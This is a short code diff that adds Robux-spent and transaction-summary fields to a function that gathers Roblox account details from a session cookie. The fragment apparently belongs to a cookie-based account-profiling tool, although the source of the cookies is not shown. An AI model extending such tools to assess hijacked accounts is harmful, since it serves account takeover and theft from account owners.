@@ -231,6 +231,8 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
       voiceEnabled,
       ageVerified,
       gamepassEarnings,
+      robuxSpent: transactionTotals.spent,
+      summary: transactionTotals.summary,
       screenshotUrl,
     };
   } catch (e) {
